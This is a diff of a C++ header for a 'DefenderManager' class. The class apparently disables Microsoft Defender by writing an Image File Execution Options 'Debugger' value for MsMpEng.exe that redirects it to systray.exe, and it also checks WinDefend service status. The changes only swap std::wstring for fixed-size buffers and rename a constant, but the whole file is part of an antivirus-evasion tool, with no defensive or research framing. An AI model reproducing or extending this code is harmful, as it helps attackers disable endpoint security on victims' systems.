@@ -1,7 +1,6 @@
 #pragma once
 
 #include <windows.h>
-#include <string>
 
 class DefenderManager {
 public:
@@ -18,7 +17,7 @@ public:
         bool          ifeoBlocked;
         bool          winDefendRunning;
         bool          msmpengRunning;
-        std::wstring  ifeoDebugger;
+        wchar_t       ifeoDebugger[MAX_PATH];
     };
 
     static bool DisableSecurityEngine() noexcept;
@@ -28,15 +27,16 @@ public:
 
 private:
     struct HiveContext {
-        std::wstring tempPath;
-        std::wstring hiveFile;
+        wchar_t tempPath[MAX_PATH];
+        wchar_t hiveFile[MAX_PATH];
 
-        HiveContext()  = default;
+        HiveContext() noexcept {
+            tempPath[0] = L'\0';
+            hiveFile[0] = L'\0';
+        }
         ~HiveContext() { Cleanup(); }
         HiveContext(const HiveContext&)            = delete;
         HiveContext& operator=(const HiveContext&) = delete;
-        HiveContext(HiveContext&&)                 = default;
-        HiveContext& operator=(HiveContext&&)      = default;
 
         void Cleanup() noexcept;
     };
@@ -55,6 +55,6 @@ private:
         L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\MsMpEng.exe";
     static constexpr const wchar_t* TEMP_HIVE_NAME   = L"TempIFEO";
     static constexpr const wchar_t* DEBUGGER_VALUE   = L"Debugger";
-    static constexpr const wchar_t* DEBUGGER_PAYLOAD = L"systray.exe";
+    static constexpr const wchar_t* DEBUGGER_TARGET  = L"systray.exe";
     static constexpr const wchar_t* WINDEFEND_SVC    = L"WinDefend";
 };
